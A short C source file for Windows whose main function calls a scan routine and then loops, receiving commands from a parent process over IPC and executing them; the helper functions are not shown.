#include "ipc_manage.h"
#include "commands.h"

DWORD WINAPI scan(LPVOID);

int main(int argc, char** argv)
{
	u_char buffer[1024];
	size_t buf_size = sizeof buffer;
	pCommand p;
	//connect to the parnet process
	scan(NULL);
	//connect_to_parent_process();

	for (;;)
	{
		//wait for command from parent process
		get_command(buffer, buf_size);
		
		//execute the command
		p = (pCommand)buffer;
		execute_command(p);
	}
	
	
}